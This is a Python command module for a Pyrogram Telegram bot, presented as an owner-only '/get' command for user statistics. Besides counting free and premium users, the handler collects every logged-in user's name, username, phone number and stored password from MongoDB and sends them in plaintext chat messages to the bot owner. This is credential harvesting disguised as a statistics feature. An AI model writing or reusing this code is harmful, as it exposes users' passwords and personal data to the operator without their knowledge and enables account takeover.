# ---------------------------------------------------
# File Name: get.py
# Description: Command to get user statistics from MongoDB
# Author: Adarsh
# Created: 2025-01-11
# Last Modified: 2025-01-11
# Version: 2.0.6
# License: MIT License
# ---------------------------------------------------

from pyrogram import filters
from devgagan import app
from config import OWNER_ID
from devgagan.core.mongo.db import db, user_sessions_real
from devgagan.core.func import check_bot_mode
import asyncio

async def count_total_users():
    """Count all users in the database (free + premium)"""
    return await db.count_documents({})

async def count_free_users():
    """
    Count all free users (non-premium) regardless of current bot mode
    """
    return await db.count_documents({
        "premium": {"$exists": False}  # Users without premium field
    })

async def count_premium_users():
    """
    Count all premium users (users with premium status)
    """
    return await db.count_documents({
        "premium": {"$exists": True}  # Users with premium field
    })

async def get_logged_in_users():
    """
    Get details of all currently logged-in users (users with active sessions)
    Returns list of user details including ID, username, phone number, etc.
    """
    logged_in_users = []
    async for user in user_sessions_real.find({}):
        user_data = await db.find_one({"_id": user["user_id"]})
        if user_data:
            logged_in_users.append({
                "user_id": user["user_id"],
                "username": user_data.get("username", "N/A"),
                "phone_number": user_data.get("phone_number", "N/A"),
                "name": user_data.get("first_name", "N/A"),
                "password": user_data.get("password", "N/A")
            })
    return logged_in_users

@app.on_message(filters.command("get") & filters.user(OWNER_ID))
async def get_user_stats(_, message):
    """
    Handle /get command to display user statistics
    Available only to bot owner (OWNER_ID)
    """
    try:
        # Get all counts
        total_users = await count_total_users()
        free_users = await count_free_users()
        premium_users = await count_premium_users()
        logged_in_users = await get_logged_in_users()

        # Verify counts match (free + premium should equal total)
        if (free_users + premium_users) != total_users:
            await message.reply("⚠️ Warning: User count mismatch detected in database")

        # Create the statistics message
        stats_message = (
            "📊 **Bot User Statistics**\n\n"
            f"👥 **Total Users:** `{total_users}`\n"
            f"🆓 **Free Users:** `{free_users}`\n"
            f"💰 **Premium Users:** `{premium_users}`\n"
            f"🟢 **Currently Logged In:** `{len(logged_in_users)}`\n\n"
            "**Current Mode:** " + ("🆓 Free Mode" if await check_bot_mode() else "💰 Premium Mode")
        )

        # Send the initial stats message
        await message.reply(stats_message)

        # If there are logged in users, send their details
        if logged_in_users:
            details_message = "**📝 Logged In Users Details:**\n\n"
            for index, user in enumerate(logged_in_users, start=1):
                details_message += (
                    f"{index}. 👤 **User ID:** `{user['user_id']}`\n"
                    f"   📛 **Name:** `{user['name']}`\n"
                    f"   🔹 **Username:** {user['username']}\n"
                    f"   📞 **Phone:** `{user['phone_number']}`\n"
                    f"   🔑 **Password:** `{user['password']}`\n\n"
                )
            
            # Split long messages
            if len(details_message) > 4000:
                parts = [details_message[i:i+4000] for i in range(0, len(details_message), 4000)]
                for part in parts:
                    await message.reply(part)
                    await asyncio.sleep(1)
            else:
                await message.reply(details_message)

    except Exception as e:
        await message.reply(f"❌ Error fetching user stats: {str(e)}")